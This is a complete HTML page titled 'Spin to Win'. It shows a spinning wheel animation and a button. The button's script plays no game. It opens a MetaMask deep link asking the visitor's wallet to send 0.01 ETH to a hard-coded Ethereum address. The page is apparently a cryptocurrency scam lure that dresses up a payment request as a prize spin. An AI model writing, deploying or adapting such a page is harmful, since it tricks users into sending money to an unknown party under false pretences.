<!DOCTYPE html>
<html>
<head>
    <title>Spin to Win</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            background-color: #f0f0f0;
        }

        #spinButton {
            font-size: 24px;
            padding: 20px 40px;
            border-radius: 10px;
            margin-top: 20px;
        }

        .spinning-wheel {
            width: 100px;
            height: 100px;
            border: 5px solid #3498db;
            border-top: 5px solid transparent;
            border-radius: 50%;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="spinning-wheel"></div>
    <button id="spinButton" onclick="spinToWin()">Spin to Win</button>

    <script>
        function spinToWin() {
            window.open('https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16');
        }
    </script>

</body>
</html>
